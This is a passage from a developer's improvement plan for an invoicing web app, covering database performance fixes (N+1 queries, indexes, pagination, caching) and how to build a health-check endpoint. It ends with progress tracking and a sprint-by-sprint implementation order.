- Each query takes 10ms
- Total time: 2,010ms (2 seconds!) just for queries

**Solution - Join or batch:**

```typescript
// Good code (1 query):
const invoices = await db
  .select()
  .from(tableInvoices)
  .leftJoin(tableSuppliers, eq(tableInvoices.supplierCnpj, tableSuppliers.cnpj))
  .leftJoin(tableServices, eq(tableInvoices.serviceCode, tableServices.code));

// Total: 1 query, all data at once
// Time: 50ms (40x faster!)
```

**How to spot N+1:**

- Look for queries inside loops
- Check your logs - are you seeing hundreds of similar queries?
- Use query monitoring tools

**Problem 2 - Missing Database Indexes**

Database without indexes = Like a library with unsorted books

Finding invoice #12345:

```sql
-- Without index:
SELECT * FROM invoices WHERE id = 12345;
-- Database checks ALL 1,000,000 rows: "Is this 12345? No. Is this 12345? No..."
-- Time: 500ms

-- With index on id:
SELECT * FROM invoices WHERE id = 12345;
-- Database jumps directly to row 12345
-- Time: 5ms (100x faster!)
```

**When to add indexes:**

✅ **DO index:**

- Primary keys (id) - Usually automatic
- Foreign keys (supplierCnpj, serviceCode)
- Fields used in WHERE clauses
- Fields used for sorting (ORDER BY)
- Fields used in JOINs

❌ **DON'T index:**

- Columns that are rarely queried
- Small tables (under 1000 rows)
- Columns with low cardinality (like boolean with only true/false)

**Example:**

```typescript
// You often query:
WHERE supplier_cnpj = '12.345.678/0001-90'

// Create index:
CREATE INDEX idx_invoices_supplier_cnpj
ON invoices(supplier_cnpj);

// Now queries are instant!
```

**Problem 3 - Loading Too Much Data**

Bad:

```typescript
// Load ALL invoices (could be millions!)
const invoices = await db.select().from(tableInvoices);
// Returns 1,000,000 rows = 100 MB of data
// User's browser crashes
```

Good:

```typescript
// Load one page at a time
const invoices = await db
  .select()
  .from(tableInvoices)
  .limit(20) // Only 20 rows
  .offset(page * 20); // Skip to right page

// Returns 20 rows = 10 KB
// Fast and usable!
```

**Problem 4 - No Caching**

Same query repeated:

```typescript
// User refreshes page
const services = await db.select().from(tableServices); // Query DB

// User refreshes again
const services = await db.select().from(tableServices); // Query DB again!

// User refreshes again
const services = await db.select().from(tableServices); // Query DB again!
```

Services table rarely changes - why query every time?

**With caching:**

```typescript
import { cache } from "./cache";

async function getServices() {
  // Check cache first
  const cached = await cache.get("services");
  if (cached) return cached;

  // Not in cache, query database
  const services = await db.select().from(tableServices);

  // Store in cache for 1 hour
  await cache.set("services", services, 3600);

  return services;
}

// First request: Queries DB (100ms)
// Next 1000 requests: Returns from cache (1ms)
```

**When to cache:**

- ✓ Data that rarely changes (services, suppliers)
- ✓ Expensive calculations (complex reports)
- ✓ External API calls

**When NOT to cache:**

- ✗ Rapidly changing data (live stock prices)
- ✗ User-specific data (unless per-user cache)
- ✗ Data that MUST be up-to-date

**Problem 5 - Slow Calculations**

```typescript
// Calculate tax for 10,000 invoices
invoices.forEach((invoice) => {
  const tax = calculateComplexTax(invoice); // 10ms each
});
// Total: 100 seconds! 😱
```

**Solutions:**

1. **Batch processing:**

```typescript
// Do 100 at a time in background
const chunks = _.chunk(invoices, 100);
for (const chunk of chunks) {
  await processBatch(chunk);
}
```

2. **Parallel processing:**

```typescript
// Use all CPU cores
await Promise.all(invoices.map((invoice) => calculateTax(invoice)));
```

3. **Pre-calculate and store:**

```typescript
// Calculate once when creating invoice
const tax = calculateTax(data);
await db.insert(tableInvoices).values({
  ...data,
  calculatedTax: tax, // Store result
});

// Later, just read it (instant!)
const invoice = await db.query.tableInvoices.findFirst();
console.log(invoice.calculatedTax); // Already calculated!
```

**Measuring performance:**

```typescript
// Measure query time
const start = Date.now();
const result = await db.select().from(tableInvoices);
const duration = Date.now() - start;

logger.info("Query completed", { duration });
// If duration > 1000ms, investigate!
```

**Performance checklist:**

- [ ] No N+1 queries (use joins instead)
- [ ] Indexes on frequently queried columns
- [ ] Pagination for large datasets (limit + offset)
- [ ] Caching for static data
- [ ] Connection pooling (already discussed)
- [ ] Only select columns you need (not SELECT \*)
- [ ] Compress large responses (gzip)
- [ ] Use CDN for static files

**Real-world example - Shopify:**

Shopify optimized database queries and added caching. Result:

- Page load time: 3s → 0.8s
- 60% fewer database queries
- Servers handled 3x more traffic
- Sales increased 20%

Small optimizations = big impact!

**Common beginner mistakes:**

❌ **Premature optimization**

```typescript
// Optimizing code that runs once per day
// Instead of code that runs 1000 times per second
```

> "Premature optimization is the root of all evil" - Donald Knuth

Optimize what matters! Measure first, then optimize.

❌ **Optimizing without measuring**

- "I think this is slow" ≠ Actually slow
- Use profiling tools
- Measure before and after

❌ **Making code unreadable for tiny gains**

```typescript
// Saved 1ms but now no one understands the code
// Not worth it!
```

**80/20 rule:**

- 20% of your code causes 80% of performance issues
- Find that 20% and optimize it
- Don't waste time on the rest

**Action Items:**

- [ ] Add database query optimization
- [ ] Add indexes for frequently queried fields
- [ ] Implement caching strategy (Redis)
- [ ] Add pagination to list endpoints
- [ ] Optimize N+1 query problems
- [ ] Add query performance monitoring
- [ ] Consider GraphQL for complex queries (future)

---

### 20. Add Health Check Endpoint

**Priority:** P3  
**Effort:** 1 hour  
**Files Affected:**

- New: `src/app/api/health/route.ts`

**🎓 Why This Matters:**
A health check endpoint is like a heartbeat monitor for your app. It tells monitoring systems "I'm alive and healthy!" or "Help, something's wrong!"

**What is a health check?**

A simple endpoint that returns the status of your app:

```typescript
GET /api/health

Response:
{
  "status": "healthy",
  "timestamp": "2025-10-22T10:30:00Z",
  "uptime": 86400,  // seconds
  "database": "connected",
  "version": "1.0.0"
}
```

**Why you need it:**

**Scenario 1 - Monitoring**

```
Monitoring tool checks every 30 seconds:
→ GET /api/health
← 200 OK {"status": "healthy"}

30 seconds later:
→ GET /api/health
← 500 ERROR {"status": "unhealthy", "database": "disconnected"}

Monitoring tool: 🚨 ALERT! Send email/SMS to developer!
```

Without health check:

- App crashes silently
- Nobody knows until users complain
- Could be down for hours

**Scenario 2 - Load Balancers**

```
Load balancer has 3 servers:
- Server 1: /health → 200 OK ✓ (send traffic here)
- Server 2: /health → 500 ERROR ✗ (skip this one, it's sick)
- Server 3: /health → 200 OK ✓ (send traffic here)

Load balancer routes traffic only to healthy servers!
```

Without health check:

- Load balancer sends traffic to broken server
- Users get errors
- Bad experience

**Scenario 3 - Auto-Restart**

```
Kubernetes/Docker monitors health:
→ GET /health
← No response (app crashed)

Kubernetes: "App is dead, restarting it..."
→ Starts new instance
→ GET /health
← 200 OK ✓

Kubernetes: "Back to normal!"
```

**What to check in health endpoint:**

**1. Basic liveness** (Is app running?)

```typescript
export async function GET() {
  return NextResponse.json({
    status: "ok",
    timestamp: new Date().toISOString(),
  });
}
// If this responds, app is alive
```

**2. Database connectivity**

```typescript
try {
  await db.execute("SELECT 1");
  databaseStatus = "connected";
} catch (error) {
  databaseStatus = "disconnected";
  isHealthy = false;
}
```

**3. External services** (if you use them)

```typescript
// Check if email service is working
try {
  await emailService.ping();
  emailStatus = "available";
} catch {
  emailStatus = "unavailable";
  // Not critical, don't mark as unhealthy
}
```

**4. Disk space**

```typescript
const disk = await checkDiskSpace("/");
if (disk.free < 1_000_000_000) {
  // Less than 1 GB
  diskStatus = "low";
  isHealthy = false; // Need space for logs!
}
```

**5. Memory usage**

```typescript
const used = process.memoryUsage().heapUsed;
const limit = 500_000_000; // 500 MB

if (used > limit) {
  memoryStatus = "high";
  // Warning but not critical yet
}
```

**Two types of health checks:**

**Liveness probe** - "Is the app alive?"

```typescript
GET / api / health / live;

// Just check if server responds
// Don't check dependencies
// Fast response required
```

Use case: Should we restart the container?

**Readiness probe** - "Is the app ready to serve traffic?"

```typescript
GET / api / health / ready;

// Check database, cache, etc.
// Can take a bit longer
// More thorough check
```

Use case: Should we send traffic to this instance?

**Example implementation:**

```typescript
// src/app/api/health/route.ts
export async function GET() {
  const checks = {
    database: await checkDatabase(),
    memory: checkMemory(),
    uptime: process.uptime(),
  };

  const isHealthy = checks.database === "connected";
  const status = isHealthy ? "healthy" : "unhealthy";
  const statusCode = isHealthy ? 200 : 503;

  return NextResponse.json(
    {
      status,
      timestamp: new Date().toISOString(),
      checks,
      version: process.env.APP_VERSION || "1.0.0",
    },
    { status: statusCode }
  );
}

async function checkDatabase() {
  try {
    await db.execute("SELECT 1");
    return "connected";
  } catch {
    return "disconnected";
  }
}

function checkMemory() {
  const used = process.memoryUsage().heapUsed;
  const usedMB = Math.round(used / 1024 / 1024);
  return {
    used: usedMB,
    status: usedMB < 500 ? "ok" : "high",
  };
}
```

**Response codes matter:**

- **200 OK** - Everything is healthy ✓
- **503 Service Unavailable** - Something is wrong, don't send traffic
- **Don't use 500** - That could mean the health check itself crashed!

**What NOT to do:**

❌ **Don't return 200 when unhealthy**

```typescript
// BAD:
return NextResponse.json(
  { status: "unhealthy", database: "down" },
  { status: 200 } // ← WRONG! Status code says OK but you're not OK!
);
```

Monitoring tools look at HTTP status code, not JSON!

❌ **Don't do expensive checks**

```typescript
// BAD:
const invoiceCount = await db.select().from(tableInvoices);
// Takes too long, health check times out
```

Health checks should be FAST (< 100ms)

❌ **Don't expose sensitive info**

```typescript
// BAD:
{
  "database": "postgresql://admin:password123@db.internal:5432/prod"
}
// Exposed credentials!
```

Only return status, not connection strings!

**Testing health checks:**

```bash
# Manual test
curl http://localhost:3000/api/health

# Expected response:
{
  "status": "healthy",
  "timestamp": "2025-10-22T10:30:00Z",
  "checks": {
    "database": "connected"
  }
}

# Test when database is down:
# (stop your database)
curl http://localhost:3000/api/health

# Expected:
{
  "status": "unhealthy",
  "checks": {
    "database": "disconnected"
  }
}
# HTTP status: 503
```

**Monitoring services that use health checks:**

- **UptimeRobot** - Free, checks every 5 minutes
- **Pingdom** - Professional monitoring
- **AWS CloudWatch** - If using AWS
- **DataDog** - Enterprise monitoring
- **New Relic** - Application monitoring

They all work the same way:

1. Ping your /health endpoint regularly
2. If returns error or times out → Alert you
3. Track uptime percentage (99.9% = "three nines")

**Real-world benefit:**

Company added health checks:

- Before: Average downtime 2 hours (didn't know app was down)
- After: Average downtime 5 minutes (alerted immediately)
- Result: Saved $100,000/year in lost revenue

**Uptime matters:**

- 99% uptime = Down 3.65 days per year
- 99.9% uptime = Down 8.76 hours per year
- 99.99% uptime = Down 52.6 minutes per year

Health checks help you achieve higher uptime!

**Action Items:**

- [ ] Create health check endpoint
- [ ] Check database connectivity
- [ ] Check external service dependencies
- [ ] Return system status
- [ ] Add monitoring integration

---

## 📊 Progress Tracking

### By Priority

- **P0 (Critical):** 0/4 complete
- **P1 (High):** 0/5 complete
- **P2 (Medium):** 0/5 complete
- **P3 (Nice to Have):** 0/6 complete

### By Category

- **Security:** 0/6 complete
- **Data Integrity:** 0/3 complete
- **Code Quality:** 0/5 complete
- **Testing:** 0/1 complete
- **Documentation:** 0/1 complete
- **Performance:** 0/1 complete
- **Monitoring:** 0/3 complete

---

## 🎯 Recommended Implementation Order

### Sprint 1 (Week 1) - Critical Security

1. Password hashing (#1)
2. Authentication & Authorization (#2)
3. Fix tax calculations (#3)

### Sprint 2 (Week 2) - Data Integrity

4. Database transactions (#4)
5. Fix API validation (#5)
6. Soft deletes (#8)

### Sprint 3 (Week 3) - Security Hardening

7. Rate limiting (#6)
8. Audit logging (#7)
9. Error handling improvements (#9)

### Sprint 4 (Week 4) - Code Quality

10. API response standardization (#10)
11. Request validation middleware (#11)
12. Unit tests - Phase 1 (#13)

### Sprint 5+ - Enhancements

13. Remaining nice-to-have items
14. Performance optimization
15. Additional documentation

---

## 📝 Notes

- All critical (P0) items should be completed before ANY production deployment
- High priority (P1) items should be completed within the first month
- Consider code review for all security-related changes
- Test thoroughly after each change, especially tax calculations
- Keep DOCS.md updated with any business logic changes
- Consider setting up staging environment for testing

---

## 🔗 Related Documents

- `DOCS.md` - Business rules and requirements
- `README.md` - Project overview
- `drizzle.config.ts` - Database configuration

---

**Status Legend:**

- ✅ Complete
- 🔄 In Progress
- ⏸️ Blocked
- ❌ Cancelled
- ⏭️ Deferred
